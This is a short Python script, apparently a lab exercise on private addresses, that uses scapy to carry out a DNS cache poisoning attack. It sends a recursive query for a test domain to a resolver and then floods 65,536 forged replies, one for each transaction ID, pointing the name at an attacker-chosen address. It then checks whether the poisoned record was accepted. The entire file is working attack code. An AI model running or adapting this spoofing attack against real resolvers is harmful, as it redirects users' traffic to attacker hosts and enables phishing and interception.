from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, dnsqtypes, sr1, sendpfast, Ether
from socket import AF_INET, SOCK_DGRAM, socket
from traceback import print_exc
import threading
import time

sock = socket(AF_INET, SOCK_DGRAM)
sock.bind(('0.0.0.0', 1234))

targetaddr="192.168.0.106"

def request(url, addr):
	return Ether()/IP(dst=addr)/UDP()/DNS(rd=1,qd=DNSQR(qname=url))

def reply(id, url, addr):
	response = Ether()/IP(dst=targetaddr)/UDP()/DNS(
		id=id, ancount=1, qr=1, aa=0, ra=0, rd=0,
		qdcount=1,
		qd=DNSQR(qname=url, qtype='A', qclass='IN'),
		an=DNSRR(rrname=url, type='A', rdata="192.168.0.104", ttl=1234))
	return response

targeturl="abc2.asdsdf.com"

pkts = []
pkts.append(request(targeturl, targetaddr))
i=0
while i <= 65535:
	pkts.append(reply(i, targeturl, targetaddr))
	i+=1

print("Packets Prepared")

#sendpfast([request(targeturl, targetaddr)], pps=70000, iface="wlan0")
#time.sleep(0.2)
sendpfast(pkts, pps=50000, iface="wlan0")

answer = sr1(IP(dst=targetaddr)/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=targeturl)),verbose=0)
print(answer[DNS].summary())
